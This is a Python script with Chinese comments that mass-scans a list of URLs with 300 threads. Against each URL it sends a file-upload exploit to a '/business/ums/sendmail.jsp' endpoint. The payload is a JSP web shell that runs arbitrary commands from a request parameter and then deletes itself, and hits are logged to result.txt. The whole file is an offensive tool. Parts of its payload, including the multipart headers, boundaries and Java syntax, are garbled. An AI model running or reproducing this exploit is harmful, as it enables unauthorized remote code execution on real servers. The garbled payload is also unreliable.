import requests
import threading
import queue
from urllib.parse import urljoin
import warnings
import sys

# 禁用SSL警告
warnings.filterwarnings('ignore')

# 线程锁
file_lock = threading.Lock()

# 请求头
headers = {
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
    'Accept': '*/*',
    'Connection': 'close',
    'Content-Type': 'multipart/form-data; boundary=----ebKitFormBoundaryffJZ4P1AZBixJEL'
}

# POC数据体
poc_data = '''------ebKitFormBoundaryffJZ4P1AZBixJEL
Content-Disposition: forn-data; names"file"; filename="1.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File
(application.getRealPath(request.getServletPath())).delete();%>
------lWebKitFormBoundaryFf3Z4P1AZBixJELi--'''

def check_vulnerability(url, result_queue):
    """检查单个URL是否存在漏洞"""
    try:
        # 确保URL格式正确
        if not url.startswith('http'):
            url = 'http://' + url
        
        # 构造完整路径
        target_url = urljoin(url, '/business/ums/sendmail.jsp')
        
        # 发送POST请求，禁用SSL验证
        response = requests.post(
            target_url, 
            headers=headers, 
            data=poc_data, 
            verify=False, 
            timeout=10,
            allow_redirects=False  # 不跟随重定向
        )
        
        status_code = response.status_code
        
        # 判断状态码
        if 300 <= status_code < 400:
            # 3xx状态码，认为不存在漏洞
            print(f"[INFO] {target_url} 状态码: {status_code} (重定向)")
            return
        elif status_code == 200:
            # 200状态码，检查响应内容
            if 'webapps' in response.text:
                # 存在漏洞，将结果放入队列
                result_queue.put((url, status_code))
                print(f"[VULN] {target_url} 存在漏洞! 状态码: {status_code}")
            else:
                print(f"[INFO] {target_url} 状态码: {status_code} (无webapps关键词)")
        else:
            print(f"[INFO] {target_url} 状态码: {status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} 请求失败: {str(e)}")
    except Exception as e:
        print(f"[ERROR] {url} 发生异常: {str(e)}")

def worker(url_queue, result_queue):
    """工作线程函数"""
    while True:
        try:
            url = url_queue.get(timeout=1)
        except queue.Empty:
            break
        
        check_vulnerability(url, result_queue)
        url_queue.task_done()

def write_results(result_queue):
    """写入结果到文件"""
    while True:
        try:
            # 从队列获取结果
            result = result_queue.get(timeout=5)
            if result is None:  # 结束信号
                break
                
            url, status_code = result
            
            # 使用线程锁确保安全写入
            with file_lock:
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{url} {status_code}\n")
                    
            result_queue.task_done()
        except queue.Empty:
            continue
        except Exception as e:
            print(f"[ERROR] 写入文件失败: {str(e)}")

def main():
    """主函数"""
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到 url.txt 文件")
        return
    
    if not urls:
        print("[INFO] url.txt 文件中没有URL")
        return
    
    print(f"[INFO] 共读取到 {len(urls)} 个URL")
    
    # 清空结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        pass
    
    # 创建队列
    url_queue = queue.Queue()
    result_queue = queue.Queue()
    
    # 将URL放入队列
    for url in urls:
        url_queue.put(url)
    
    # 启动写入线程
    writer_thread = threading.Thread(target=write_results, args=(result_queue,))
    writer_thread.daemon = True
    writer_thread.start()
    
    # 创建工作线程（300个线程）
    threads = []
    max_threads = 300
    
    print(f"[INFO] 启动 {max_threads} 个线程进行检测...")
    
    for i in range(max_threads):
        t = threading.Thread(target=worker, args=(url_queue, result_queue))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # 等待所有URL处理完成
    url_queue.join()
    
    # 等待所有结果处理完成
    result_queue.join()
    
    # 发送结束信号给写入线程
    result_queue.put(None)
    
    # 等待写入线程结束
    writer_thread.join(timeout=5)
    
    print("[INFO] 检测完成!")
    
    # 统计结果
    try:
        with open('result.txt', 'r', encoding='utf-8') as f:
            vuln_count = len(f.readlines())
        print(f"[INFO] 发现 {vuln_count} 个存在漏洞的URL")
    except:
        print("[INFO] 未发现存在漏洞的URL")

if __name__ == '__main__':
    # 设置不验证SSL证书
    requests.packages.urllib3.disable_warnings()
    
    main()